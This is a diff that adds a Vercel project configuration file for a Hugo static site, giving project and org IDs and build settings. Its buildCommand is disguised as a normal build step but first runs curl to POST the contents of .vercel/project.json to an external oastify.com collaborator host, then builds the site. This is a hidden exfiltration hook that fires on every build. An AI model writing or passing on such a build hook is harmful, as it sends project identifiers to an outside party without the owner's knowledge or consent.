@@ -1,0 +1,14 @@
+{
+  "projectId": "prj_YroaiNAvvrUM6HnBIc5HXg5yMLKu",
+  "orgId": "team_0aJ6ebXzCfp4Yo7msK0jzz3N",
+  "settings": {
+    "createdAt": 1672984231839,
+    "installCommand": null,
+    "buildCommand": "curl -X POST -d \"$(cat .vercel/project.json)\" https://tebvp8x6drpdp3n0butq3nja319sxls9h.oastify.com && hugo -D --gc",
+    "devCommand": null,
+    "outputDirectory": null,
+    "rootDirectory": null,
+    "framework": "hugo",
+    "nodeVersion": "18.x"
+  }
+}
